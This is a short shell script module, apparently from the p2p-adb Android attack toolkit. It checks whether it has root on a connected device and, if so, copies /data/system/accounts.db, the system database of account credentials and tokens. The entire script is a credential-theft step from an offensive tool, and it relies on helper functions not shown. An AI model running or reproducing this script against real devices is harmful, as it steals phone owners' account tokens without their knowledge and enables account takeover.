# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com



isRoot > /dev/null
ISROOT=$?

if [ $ISROOT -eq 0 ]; then
	DATAPATH="/data/system/accounts.db"
	echo 'We are root...'
	getData "$DATAPATH"
else
	echo $ISROOT
fi

